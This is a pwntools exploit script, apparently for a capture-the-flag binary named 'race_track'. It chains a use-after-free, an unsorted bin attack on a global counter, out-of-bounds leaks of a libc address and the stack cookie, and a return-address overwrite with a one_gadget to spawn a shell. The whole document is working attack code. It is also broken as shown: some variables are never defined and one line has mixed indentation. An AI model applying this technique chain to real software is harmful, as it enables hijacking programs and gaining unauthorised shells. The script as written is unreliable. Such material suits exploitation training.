from pwn import * 
import os

# Binary setup
elf_name = 'race_track'
libc_name='' # Should use 2.23. But, some other versions might be vulnerable

elf = ELF(elf_name)

if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process(elf.path)
	#context.terminal = ['tmux', 'sp', '-h']
	#gdb.attach(p) 
else: 
	p = remote(domain, port) 

# Primatives for all of the functions that are needed for the exploit

def create_racer(name, rank): 
	p.sendlineafter(">", "6") # Create racer option 
	p.sendlineafter("rank:", str(rank)) # The rank of the racer 
	p.sendlineafter("name:", str(name)) # The name of the user
	return 

def delete_racer(index): 
	p.sendlineafter(">", "10") 
	p.sendlineafter("delete:", str(index))	
	return 

def update_racer(index, name, rank): 
	p.sendlineafter(">", "9") 
	p.sendlineafter("update:", str(index)) 
	p.sendlineafter("rank:", str(rank))
	p.sendlineafter("name:", str(name)) 

def view_sponsor_count(): 
	p.sendlineafter(">", "2") 
	p.recvuntil("sponsors:") 
	count = int(p.recvline()) 
	return count 

def view_sponsor_information(index): 
	p.sendlineafter(">", "4") 
	p.sendlineafter("view:",str(index)) 
 	p.recvuntil("Sponsor ") # Get the name
	name = p.recvuntil("--") 
	p.recvuntil("Uses: ")  # Get the uses
	uses = p.recvuntil(",")  

	p.recvuntil("Last Score: ") # Get the last score 
	last_score = p.recvline() 
	
	return name, uses, last_score

def update_sponsor(index, name): 
	p.sendlineafter(">", "5") 
	p.sendlineafter("update:", str(index)) 
	p.sendlineafter("name:", str(name)) 	
	return 

def race(sponsor_index, racer_index, response): 
	p.sendlineafter(">", str(11)) 
	p.sendlineafter("use:", str(sponsor_index)) 
	p.sendlineafter("use:", str(racer_index))
	p.sendlineafter("sponsor?", str(response))
	return 

# Pwn functions... 

# Overwrite the sponsor_counter global variable by using the unsorted bin attack. Note: PIE is not enabled on this binary, making this attack possible
def overwrite_sponsor_counter(sponsor_counter_addr):

	print("Creating two racers...") 	
	print("-------------------------------") 
	create_racer("A" * 15, 1) # UAF item -- Racer 0 
	create_racer("B" * 15, 2) # Create this so that the free chunk does not consolidate with the top. -- Racer 1

	print("Free racer 0 to trigger the UAF") 
	print("-------------------------------") 
	# Trigger the UAF
	delete_racer(0) 

	print("Overwrite the bk pounter of the unsorted bin chunk via the UAF") 
	print("Set this value to the location of the sponsor_counter")
	print("-------------------------------") 
	# Overwrite the bk pointer of the unsorted bin chunk
	update_racer(0, "C" * 15, sponsor_counter_addr)

	print("Trigger the unsorted bin attack by mallocing a value of the same size") 
	print("-------------------------------") 
	# Trigger the unsorted bin attack.
	# This will overwrite the sponsor_counter with a VERY large value. 
	create_racer("D" * 15, 1) 

# Leaks LibC via the amount of sponsors
# Leaks the stack cookie because of the overwritten index
def leaks():
	
	# The unsorted bin attack wrote this value to the counter. 
	# This value is the location of the unsorted_bin itself.
	libc_leak = view_sponsor_count() 
	print("Leak LibC address..." + hex(libc_leak))
	print("-------------------------------") 
	

	# The 12th element (which, because this is 0 indexed, would be out of range) is accessible because we overwrite the sponsor_counter 
	# The 12th element holders the value of the stack cookie in the last_score
	name, uses, last_score = view_sponsor_information(12)	 
	stack_cookie = int(last_score) 
	print("Leaking stack cookie..." + hex(stack_cookie))
	print("------------------------------") 

	return libc_leak, stack_cookie

# Using the overwritten index value, overwrite the return address and the stack cookie of the main function
def overwrite_ret_address(libc_leak, stack_cookie):
	print("Calculate one_gadget address...") 	
	print("-----------------------------")

	# Calculate the one_gadget gadget 
	beginning_libc_offset = 0x3c4b78 
	libc_base = libc_leak - 0x3c4b78 
	one_gadget = libc_base + 0x45216
	print("One_gadget addresss: " + hex(one_gadget)) 	

	print("----------------------------") 
	print("Overwrite return address....") 
	print("-----------------------------") 
	# The 12th element resides over the stack cookie and the return address
	# Set the return address of the function to a gadget
	# Note: This will overwrite the stack cookie with 0
	update_sponsor(12, "E" *24 + p64(one_gadget))
	p.sendline('1') 
	p.sendline('1')  

	print("Setting the stack cookie...") 
	print("---------------------------") 
	# The racing option has a 'grade for the sponsor' to add. 
	# This 'grade' corresponds with the stack cookie 
	# By setting this on the stack cookie, we can set the stack cookie.	
	race(12,0, stack_cookie) 
	
# Pop the shell!	
def pop_shell():	
	# This 'quits' the program
	# Because the return address has been overwritten by a one gadget, this ends up in a shell :) 
	print("Quit") 
	print("SHELL :)")
	print("---------------------------")
	p.sendlineafter(">", str(12))
	p.interactive()

sponsor_counter_addr = 0x6020f0 
overwrite_sponsor_counter(sponsor_counter_addr)
libc_leak, stack_cookie = leaks()
overwrite_ret_address(libc_leak, stack_cookie) 
pop_shell()
